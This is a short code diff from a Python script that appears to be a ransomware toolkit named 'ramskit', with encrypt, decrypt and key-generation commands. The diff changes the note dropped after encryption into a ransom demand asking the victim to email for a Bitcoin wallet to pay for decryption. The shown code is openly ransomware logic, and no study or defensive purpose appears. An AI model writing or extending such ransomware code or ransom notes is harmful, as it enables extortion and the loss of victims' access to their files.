@@ -77,7 +77,10 @@ if __name__ == '__main__':
             ramskit.encrypt_file(items)
 
             with open(path + '/look_at_me.txt', 'w') as f:
-                f.write("Heyo, this file has been encrypted!. You can decrypt them by running the decrypt command, or to send this \n\n")
+                f.write('''
+                    Heyo, this file has been encrypted!. 
+                    You need to email me so I can give u my BTC wallet for the 
+                    decrypt's purchase lololololol \n\n''')
         case 'decrypt':
             os.remove(path + '/look_at_me.txt')
 
@@ -85,7 +88,7 @@ if __name__ == '__main__':
             ramskit.decrypt_file(items)
 
             with open(path + '/look_at_me.txt', 'w') as f:
-                f.write("Now you can access your files again. \n\n")
+                f.write("Now you can access your files again. Hoorah \n\n")
         case 'generate_key':
             print(ramskit.generate_key())
         case _:
